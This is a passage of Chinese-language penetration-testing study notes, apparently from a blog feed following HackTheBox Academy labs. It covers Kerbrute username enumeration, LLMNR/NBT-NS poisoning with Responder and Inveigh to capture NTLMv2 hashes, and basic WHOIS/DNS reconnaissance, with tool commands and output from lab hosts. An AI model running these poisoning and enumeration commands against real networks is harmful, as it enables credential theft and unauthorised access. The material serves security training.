clone https://github.com/ropnop/kerbrute.git</code></pre><p>键入make help将向我们显示可用的编译选项。</p><pre><code class="shell-session">Tanin@htb[/htb]$ make helphelp:            Show this help.windows:  Make Windows x86 and x64 Binarieslinux:  Make Linux x86 and x64 Binariesmac:  Make Darwin (Mac) x86 and x64 Binariesclean:  Delete any binariesall:  Make Windows, Linux and Mac x86/x64 Binaries</code></pre><p>我们可以选择只编译一个二进制文件或类型make all，并分别编译一个用于Linux、Windows和Mac系统（每个系统都有x86和x64版本）。</p><p>新创建的dist目录将包含我们编译的二进制文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls dist/kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe</code></pre><h4 id="Testing-the-kerbrute-linux-amd64-Binary"><a href="#Testing-the-kerbrute-linux-amd64-Binary" class="headerlink" title="Testing the kerbrute_linux_amd64 Binary"></a>Testing the kerbrute_linux_amd64 Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./kerbrute_linux_amd64     __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnopThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accountsUsage:  kerbrute [command]    &lt;SNIP&gt;</code></pre><p>我们可以将该工具添加到我们的PATH中，使其可以从主机上的任何位置轻松访问。</p><h4 id="Adding-the-Tool-to-our-Path"><a href="#Adding-the-Tool-to-our-Path" class="headerlink" title="Adding the Tool to our Path"></a>Adding the Tool to our Path</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo $PATH/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools</code></pre><h4 id="Moving-the-Binary"><a href="#Moving-the-Binary" class="headerlink" title="Moving the Binary"></a>Moving the Binary</h4><pre><code class="shell-session">sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></pre><h4 id="Enumerating-Users-with-Kerbrute"><a href="#Enumerating-Users-with-Kerbrute" class="headerlink" title="Enumerating Users with Kerbrute"></a>Enumerating Users with Kerbrute</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users2021/11/17 23:01:46 &gt;  Using KDC(s):2021/11/17 23:01:46 &gt;   172.16.5.5:882021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL2021/11/17 23:01:50 &gt;  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL &lt;SNIP&gt; 2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL2021/11/17 23:01:52 &gt;  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL2021/11/17 23:01:56 &gt;  Done! Tested 48705 usernames (56 valid) in 9.940 seconds</code></pre><h2 id="Identifying-Potential-Vulnerabilities"><a href="#Identifying-Potential-Vulnerabilities" class="headerlink" title="Identifying Potential Vulnerabilities"></a>Identifying Potential Vulnerabilities</h2><p>本地系统帐户NT AUTHORITY\system是Windows操作系统中的内置帐户。它在操作系统中具有最高级别的访问权限，用于运行大多数Windows服务。默认情况下，第三方服务在该帐户的上下文中运行也是非常常见的。加入域的主机上的SYSTEM帐户将能够通过模拟计算机帐户来枚举Active Directory，而计算机帐户本质上只是另一种用户帐户。在域环境中拥有SYSTEM级别的访问权限几乎相当于拥有域用户帐户。 有几种方法可以在主机上获得SYSTEM级别的访问权限，包括但不限于： 远程Windows漏洞利用，如MS08-067、EternalBlue或BlueKeep。 滥用在SYSTEM帐户上下文中运行的服务，或使用<a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a>滥用服务帐户SeImpersonate权限。这种类型的攻击在旧的Windows操作系统上是可能的，但在Windows Server 2019上并不总是可能的。 Windows操作系统中的本地权限提升缺陷，如Windows 10任务计划程序0天。 使用本地帐户在加入域的主机上获得管理员访问权限，并使用Psexec启动SYSTEM cmd窗口 通过在加入域的主机上获得SYSTEM级别的访问权限，您将能够执行以下操作，但不限于： 使用内置工具或攻击性工具（如BloodHound和PowerView）枚举域。 在同一域内执行Kerberoasting&#x2F;ASREPRoasting攻击。 运行Inveigh等工具来收集Net-NTLMv2哈希或执行SMB中继攻击。 执行令牌模拟以劫持特权域用户帐户。 执行ACL攻击。</p><h1 id="Sniffing-out-a-Foothold"><a href="#Sniffing-out-a-Foothold" class="headerlink" title="Sniffing out a Foothold"></a>Sniffing out a Foothold</h1><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Linux"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Linux" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Linux"></a>LLMNR&#x2F;NBT-NS Poisoning - from Linux</h1><p>在这个阶段，我们将同时使用两种不同的技术：网络中毒和密码喷洒。我们将执行这些操作，目的是为域用户帐户获取有效的明文凭据，从而使我们在域中有一个立足点，从认证的角度开始下一阶段的枚举。</p><p>收集凭据并在评估过程中获得初步立足点的常见方法：对链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）广播的中间人攻击。根据网络的不同，此攻击可能提供低特权或管理级别的密码哈希，这些哈希可以离线破解，甚至可以是明文凭据。这些哈希有时也可用于执行SMB中继攻击，以向具有管理权限的域中的一台或多台主机进行身份验证，而无需离线破解密码哈希。</p><h2 id="LLMNR-amp-NBT-NS-Primer"><a href="#LLMNR-amp-NBT-NS-Primer" class="headerlink" title="LLMNR &amp; NBT-NS Primer"></a>LLMNR &amp; NBT-NS Primer</h2><p>链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）是Microsoft Windows组件，用作DNS失败时可以使用的主机标识的替代方法。如果一台机器试图解析主机，但DNS解析失败，通常情况下，该机器会尝试通过LLMNR向本地网络上的所有其他机器询问正确的主机地址。LLMNR基于域名系统（DNS）格式，并允许同一本地链路上的主机为其他主机执行名称解析。它本机使用UDP上的端口&#x3D;&#x3D;5355&#x3D;&#x3D;。如果LLMNR失败，将使用NBT-NS。NBT-NS通过其NetBIOS名称识别本地网络上的系统。&#x3D;&#x3D;NBT-NS通过UDP利用端口137&#x3D;&#x3D;。 这里的关键是，当LLMNR&#x2F;NBT-NS用于名称解析时，网络上的任何主机都可以回复。这就是我们使用Responder来毒害这些请求的地方。通过网络访问，我们可以通过响应LLMNR和NBT-NS流量来欺骗广播域中的权威名称解析源（在这种情况下，是指应该属于网段的主机），就好像它们有请求主机的答案一样。这种中毒行为是为了让受害者通过假装我们的流氓系统知道请求主机的位置来与我们的系统通信。如果请求的主机需要名称解析或身份验证操作，我们可以捕获NetNTLM哈希，并对其进行离线暴力攻击，试图检索明文密码。捕获的身份验证请求也可以被中继以访问另一台主机，或者针对同一台主机上的不同协议（如LDAP）使用。LLMNR&#x2F;NBNS欺骗加上缺乏SMB签名，通常会导致对域内主机的管理访问。SMB中继攻击将在稍后的关于横向移动的模块中介绍。</p><h2 id="Quick-Example-LLMNR-x2F-NBT-NS-Poisoning"><a href="#Quick-Example-LLMNR-x2F-NBT-NS-Poisoning" class="headerlink" title="Quick Example - LLMNR&#x2F;NBT-NS Poisoning *"></a>Quick Example - LLMNR&#x2F;NBT-NS Poisoning *</h2><p>让我们从一个非常高的层面来简要介绍一下攻击流程的示例： 主机试图连接到位于\print01.inlanefreight.local的打印服务器，但意外键入\printer01.inlanefleight.local。 DNS服务器响应，声明此主机未知。 然后，主机向整个本地网络广播，询问是否有人知道\printer01.inlanefreight.local的位置。 攻击者（我们运行的是Responder）响应主机，指出主机正在查找\printer01.inlanefreight.local。 主机相信此回复，并使用用户名和NTLMv2密码哈希向攻击者发送身份验证请求。 如果存在正确的条件，则可以脱机破解此哈希，或将其用于SMB中继攻击。</p><table><thead><tr><th><strong>Tool</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><a href="https://github.com/lgandx/Responder">Responder</a></td><td>Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.</td></tr><tr><td><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td><td>Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.</td></tr><tr><td><a href="https://www.metasploit.com/">Metasploit</a></td><td>Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.</td></tr></tbody></table><p>我们通常使用Linux攻击主机从客户端内部网络上的匿名位置开始进行内部渗透测试。像Responder这样的工具非常适合建立一个立足点，我们稍后可以通过进一步的枚举和攻击来扩展它。Responder是用Python编写的，通常用于Linux攻击主机，但也有适用于Windows的.exe版本。Inveigh同时使用C#和PowerShell编写（被认为是遗留版本）。这两种工具都可以用来攻击以下协议：</p><ul><li>LLMNR</li><li>DNS</li><li>MDNS</li><li>NBNS</li><li>DHCP</li><li>ICMP</li><li>HTTP</li><li>HTTPS</li><li>SMB</li><li>LDAP</li><li>WebDAV</li><li>Proxy Auth</li></ul><p>Responder also has support for:</p><ul><li>MSSQL</li><li>DCE-RPC</li><li>FTP, POP3, IMAP, and SMTP auth</li></ul><h3 id="Responder-In-Action"><a href="#Responder-In-Action" class="headerlink" title="Responder In Action *"></a>Responder In Action *</h3><p>让我们通过在控制台中键入responser-h来查看一些可用的选项。</p><p>如模块前面所示，-A标志使我们进入分析模式，使我们能够在环境中查看NBT-NS、BROWSER和LLMNR请求，而不会破坏任何响应。我们必须始终提供接口或IP。我们通常想要使用的一些常见选项是-wf；这将启动WPAD rogue代理服务器，而-f将尝试对远程主机操作系统和版本进行指纹识别。如果遇到问题，我们可以使用-v标志来增加详细程度，但这将导致大量额外的数据打印到控制台。其他选项（如-F和-P）可用于强制NTLM或基本身份验证和强制代理身份验证，但可能会导致登录提示，因此应谨慎使用。-w标志的使用利用了内置的WPAD代理服务器。这可能非常有效，尤其是在大型组织中，因为如果浏览器启用了“自动检测”设置，它将捕获启动Internet Explorer的任何用户的所有HTTP请求。</p><p>使用上面显示的配置，响应程序将侦听并回答它在线路上看到的任何请求。如果成功并成功捕获了哈希，Responder将在屏幕上打印出来，并将其写入&#x2F;usr&#x2F;share&#x2F;resporter&#x2F;logs目录中的每个主机的日志文件中。哈希以（MODULE_NAME）-（HASH_TYPE）-（CLIENT_IP）.txt格式保存，除非启用-v模式，否则一个哈希将打印到控制台并存储在其关联的日志文件中。例如，日志文件可能类似于SMB-NTLMv2-SP-172.16.5.25。哈希也存储在SQLite数据库中，该数据库可以在Responder.conf配置文件中配置，通常位于&#x2F;usr&#x2F;share&#x2F;resporter中，除非我们直接从GitHub克隆Responder repo。 我们必须以sudo权限或root身份运行该工具，并确保攻击主机上有以下端口可用，使其发挥最佳功能：</p><pre><code class="shell-session">UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353</code></pre><h4 id="Responder-Logs"><a href="#Responder-Logs" class="headerlink" title="Responder Logs"></a>Responder Logs</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lsAnalyzer-Session.log                Responder-Session.logConfig-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txtHTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txtPoisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txtProxy-Auth-NTLMv2-172.16.5.200.txt</code></pre><h4 id="Starting-Responder-with-Default-Settings"><a href="#Starting-Responder-with-Default-Settings" class="headerlink" title="Starting Responder with Default Settings"></a>Starting Responder with Default Settings</h4><pre><code class="bash">sudo responder -I ens224 </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309232006463.png" alt="image"></p><h1 id="LLMNR-x2F-NBT-NS-Poisoning-from-Windows"><a href="#LLMNR-x2F-NBT-NS-Poisoning-from-Windows" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning - from Windows"></a>LLMNR&#x2F;NBT-NS Poisoning - from Windows</h1><p>本节将探讨 <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>工具，并尝试捕获另一组凭据。</p><h2 id="Inveigh-Overview"><a href="#Inveigh-Overview" class="headerlink" title="Inveigh - Overview"></a>Inveigh - Overview</h2><p>工具Inveigh的工作原理与Responder类似，但使用PowerShell和C#编写。Inveigh可以监听IPv4和IPv6以及其他几种协议，包括LLMNR、DNS、mDNS、NBNS、DHCPv6、ICMPv6、HTTP、HTTPS、SMB、LDAP、WebDAV和代理身份验证。</p><h2 id="Using-Inveigh"><a href="#Using-Inveigh" class="headerlink" title="Using Inveigh"></a>Using Inveigh</h2><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\Inveigh.ps1PS C:\htb&gt; (Get-Command Invoke-Inveigh).Parameters</code></pre><p>让我们从LLMNR和NBNS欺骗开始Inveigh，然后输出到控制台并写入文件。我们将保留其余的默认值，这可以在这里看到 <a href="https://github.com/Kevin-Robertson/Inveigh#parameter-help">here</a>。</p><pre><code class="powershell-session">PS C:\htb&gt; Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y[*] Inveigh 1.506 started at 2022-02-28T19:26:30[+] Elevated Privilege Mode = Enabled[+] Primary IP Address = 172.16.5.25[+] Spoofer IP Address = 172.16.5.25[+] ADIDNS Spoofer = Disabled[+] DNS Spoofer = Enabled[+] DNS TTL = 30 Seconds[+] LLMNR Spoofer = Enabled[+] LLMNR TTL = 30 Seconds[+] mDNS Spoofer = Disabled[+] NBNS Spoofer For Types 00,20 = Enabled[+] NBNS TTL = 165 Seconds[+] SMB Capture = Enabled[+] HTTP Capture = Enabled[+] HTTPS Certificate Issuer = Inveigh[+] HTTPS Certificate CN = localhost[+] HTTPS Capture = Enabled[+] HTTP/HTTPS Authentication = NTLM[+] WPAD Authentication = NTLM[+] WPAD NTLM Authentication Ignore List = Firefox[+] WPAD Response = Enabled[+] Kerberos TGT Capture = Disabled[+] Machine Account Capture = Disabled[+] Console Output = Full[+] File Output = Enabled[+] Output Directory = C:\ToolsWARNING: [!] Run Stop-Inveigh to stop[*] Press any key to stop console outputWARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listenerWARNING: [!] [2022-02-28T19:26:31] Exception calling &quot;Start&quot; with &quot;0&quot; argument(s): &quot;An attempt was made to access asocket in a way forbidden by its access permissions&quot; $HTTP_listener.Start()[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled][+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent][+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834&lt;SNIP&gt;</code></pre><p>我们可以看到，我们立即开始获取LLMNR和mDNS请求。下面的动画显示了该工具的作用。</p><p><img src="https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png" alt="image"></p><h2 id="C-Inveigh-InveighZero"><a href="#C-Inveigh-InveighZero" class="headerlink" title="C# Inveigh (InveighZero)"></a>C# Inveigh (InveighZero)</h2><p>Invenigh的PowerShell版本是原始版本，不再更新。工具作者维护C#版本，该版本结合了原始PoC C#代码和PowerShell版本中大部分代码的C#端口。在我们可以使用C#版本的工具之前，我们必须编译可执行文件</p><pre><code class="powershell-session">PS C:\htb&gt; .\Inveigh.exe</code></pre><pre><code class="powershell-session">[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276][+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Listener Addresses [IP 0.0.0.0 | IPv6 ::][+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8][+] Spoofer Options [Repeat Enabled | Local Attacks Disabled][ ] DHCPv6[+] DNS Packet Sniffer [Type A][ ] ICMPv6[+] LLMNR Packet Sniffer [Type A][ ] MDNS[ ] NBNS[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80][ ] HTTPS[+] WebDAV [WebDAVAuth NTLM][ ] Proxy[+] LDAP Listener [Port 389][+] SMB Packet Sniffer [Port 445][+] File Output [C:\Tools][+] Previous Session Files (Not Found)[*] Press ESC to enter/exit interactive console[!] Failed to start HTTP listener on port 80, check IP and port usage.[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled][ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]</code></pre><p>正如我们所看到的，该工具启动并显示哪些选项默认启用，哪些选项未启用。带[+]的选项是默认的，默认情况下是启用的，之前带[]的选项是禁用的。正在运行的控制台输出还向我们显示了哪些选项被禁用，因此不会发送响应（上例中为mDNS）。我们还可以看到消息Press ESC to enter&#x2F;exit interactive console，这在运行该工具时非常有用。控制台允许我们访问捕获的凭据&#x2F;哈希，允许我们停止Inveigh等。</p><p>我们可以在Inveigh运行时按esc键进入控制台。</p><pre><code class="powershell-session">&lt;SNIP&gt;[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent][+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored][-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored][.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311C(0:0) NTLMv1(0:0) NTLMv2(3:9)&gt; HELP</code></pre><p>在键入HELP并点击enter后，我们将看到几个选项：</p><pre><code class="powershell-session">=============================================== Inveigh Console Commands ===============================================Command                           Description========================================================================================================================GET CONSOLE                     | get queued console outputGET DHCPv6Leases                | get DHCPv6 assigned IPv6 addressesGET LOG                         | get log entries; add search string to filter resultsGET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter resultsGET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter resultsGET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter resultsGET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter resultsGET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashesGET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashesGET CLEARTEXT                   | get captured cleartext credentialsGET CLEARTEXTUNIQUE             | get unique captured cleartext credentialsGET REPLYTODOMAINS              | get ReplyToDomains parameter startup valuesGET REPLYTOHOSTS                | get ReplyToHosts parameter startup valuesGET REPLYTOIPS                  | get ReplyToIPs parameter startup valuesGET REPLYTOMACS                 | get ReplyToMACs parameter startup valuesGET IGNOREDOMAINS               | get IgnoreDomains parameter startup valuesGET IGNOREHOSTS                 | get IgnoreHosts parameter startup valuesGET IGNOREIPS                   | get IgnoreIPs parameter startup valuesGET IGNOREMACS                  | get IgnoreMACs parameter startup valuesSET CONSOLE                     | set Console parameter valueHISTORY                         | get command historyRESUME                          | resume real time console outputSTOP                            | stop Inveigh</code></pre><p>我们可以通过键入GET NTLMV2UNIQUE快速查看捕获的唯一哈希。</p><p>我们可以键入GET NTLMV2USERNAMES并查看我们收集了哪些用户名。如果我们想要一个用户列表来执行额外的枚举，并查看哪些值得尝试使用Hashcat离线破解，这将非常有用。</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sniffing out a Foothold&lt;/li&gt;
&lt;li&gt;Initial Enumeration&lt;/li&gt;
&lt;li&gt;Sniffing out a Foothold&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>Information Gathering</title>
    <link href="https://taninluv.github.io/2023/09/18/Information-Gathering/"/>
    <id>https://taninluv.github.io/2023/09/18/Information-Gathering/</id>
    <published>2023-09-18T08:11:47.000Z</published>
    <updated>2023-09-18T09:49:15.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><p>信息收集阶段是每次渗透测试的第一步，我们需要在没有目标组织内部信息的情况下模拟外部攻击者。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309181613272.png" alt="img"></p><span id="more"></span><p>例如，我们可以将其视为在基于SSL证书的渗透测试中偶然发现新子域。然而，如果我们仔细观察这些子域，我们经常会看到与主要公司网站不同的技术在使用。子域和vhosts用于呈现其他信息，并执行与主页分离的其他任务。因此，必须了解使用了哪些技术，它们有什么用途，以及它们是如何工作的。在此过程中，我们的目标是从以下领域尽可能多地识别信息：</p><ul><li>域和子域</li><li>IP范围</li><li>基础设施</li><li>虚拟主机</li></ul><h1 id="WHOIS"><a href="#WHOIS" class="headerlink" title="WHOIS"></a>WHOIS</h1><p> <a href="https://en.wikipedia.org/wiki/WHOIS">WHOIS</a>域查找允许我们检索已注册域的域名信息。互联网名称与数字地址分配机构（ICANN）要求经认证的注册商在注册域名后立即在Whois数据库中输入持有人的联系信息、域名的创建和有效期以及其他信息。简单地说，Whois数据库是目前全球注册的所有域名的可搜索列表。 WHOIS查找最初是使用命令行工具执行的。如今，存在许多基于web的工具，但命令行选项通常使我们能够最大限度地控制查询，并帮助过滤和排序结果输出。Sysinternals WHOIS for Windows或Linux WHOIS命令行实用程序是我们收集信息的首选工具。然而，我们也可以使用一些在线版本，如 <a href="https://whois.domaintools.com/">whois.domaintools.com</a>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ whois $TARGET</code></pre><p>从这个输出中，我们收集了以下信息：</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="Nslookup-amp-DIG"><a href="#Nslookup-amp-DIG" class="headerlink" title="Nslookup &amp; DIG"></a>Nslookup &amp; DIG</h2><p>我们来看看Nslookup命令行实用程序。让我们假设一位客户要求我们进行外部渗透测试。因此，我们首先需要熟悉它们的基础设施，并确定哪些主机是可以公开访问的。我们可以使用不同类型的DNS请求来找到这一点。使用Nslokup，我们可以在互联网上搜索域名服务器，并向他们询问有关主机和域的信息。尽管该工具有两种模式，交互式和非交互式，但我们将主要关注非交互式模块。 我们只需提交域名就可以查询A记录。但是我们也可以使用-query参数来搜索特定的资源记录。例如：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nslookup $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:Name:facebook.comAddress: 31.13.92.36Name:facebook.comAddress: 2a03:2880:f11c:8083:face:b00c:0:25de</code></pre><p>如果需要，我们还可以通过在命令中添加@&lt;nameserver&#x2F;IP&gt;来指定名称服务器。与nslookup不同，DIG向我们展示了一些更重要的信息。</p><pre><code class="shell-session">Tanin@htb[/htb]$ dig facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58899;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;facebook.com.                  IN      A;; ANSWER SECTION:facebook.com.           169     IN      A       31.13.92.36;; Query time: 20 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:03:17 CEST 2021;; MSG SIZE  rcvd: 57</code></pre><p>条目以完整的域名开始，包括最后一个点。在必须再次请求信息之前，该条目可以在高速缓存中保持169秒</p><h4 id="Querying-A-Records-for-a-Subdomain"><a href="#Querying-A-Records-for-a-Subdomain" class="headerlink" title="Querying: A Records for a Subdomain"></a>Querying: A Records for a Subdomain</h4><pre><code class="shell-session">Tanin@htb[/htb]$ export TARGET=www.facebook.comTanin@htb[/htb]$ nslookup -query=A $TARGETServer:1.1.1.1Address:1.1.1.1#53Non-authoritative answer:www.facebook.comcanonical name = star-mini.c10r.facebook.com.Name:star-mini.c10r.facebook.comAddress: 31.13.92.36</code></pre><p>Querying: A Records for a Subdomain</p><pre><code class="shell-session">Tanin@htb[/htb]$ dig a www.facebook.com @1.1.1.1; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; a www.facebook.com @1.1.1.1;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 15596;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232;; QUESTION SECTION:;www.facebook.com.              IN      A;; ANSWER SECTION:www.facebook.com.       3585    IN      CNAME   star-mini.c10r.facebook.com.star-mini.c10r.facebook.com. 45 IN      A       31.13.92.36;; Query time: 16 msec;; SERVER: 1.1.1.1#53(1.1.1.1);; WHEN: Mo Okt 18 16:11:48 CEST 2021;; MSG SIZE  rcvd: 90</code></pre><h4 